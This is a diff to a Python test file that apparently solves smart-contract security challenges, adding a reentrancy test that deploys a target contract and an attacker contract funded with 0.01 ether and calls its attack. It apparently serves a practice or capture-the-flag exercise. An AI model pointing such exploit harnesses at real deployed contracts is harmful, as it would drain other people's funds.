@@ -14,3 +14,16 @@ def test_coinFlip():
     for x in range(0, 10):
         attacker.guessFlip({"from": account}).wait(1)
     print("CoinFlip attacked! Try submitting the solution as complete.")
+
+def test_reentrance():
+    account = get_account()
+
+    reentrance = deploy_contract(Reentrance, "Reentrance", 1, [])
+    print(f"Before the attack...account balance: {reentrance.balanceOf(account.address)}")
+    #attacker = deploy_contract(AttackReentrancy, "AttackReentrancy", 0, [reentrance.address])
+
+    attacker = AttackReentrancy.deploy(reentrance.address, {"from": account.address, "value":Wei("0.01 ether")}, publish_source=False)
+    
+    attacker.attack(Wei("0.01 ether"), {"from":account.address}).wait(1)
+    print(f"After the attack...account balance: {reentrance.balanceOf(account.address)}, count: {attacker.count()}")
+    
